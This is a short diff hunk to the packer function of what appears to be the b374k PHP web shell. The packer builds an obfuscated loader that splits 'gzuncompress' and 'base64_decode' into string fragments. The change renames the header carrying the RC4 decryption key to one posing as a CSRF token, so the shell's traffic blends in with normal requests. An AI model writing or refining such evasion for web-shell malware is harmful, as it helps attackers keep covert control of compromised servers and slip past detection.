@@ -581,7 +581,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = "gz'.'un'.'com'.'pre'.'ss(".$encoder_func."(isset(\$_SERVER[\\'HTTP_RC4_KEY\\'])?\$_SERVER[\\'HTTP_RC4_KEY\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = "gz'.'un'.'com'.'pre'.'ss(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
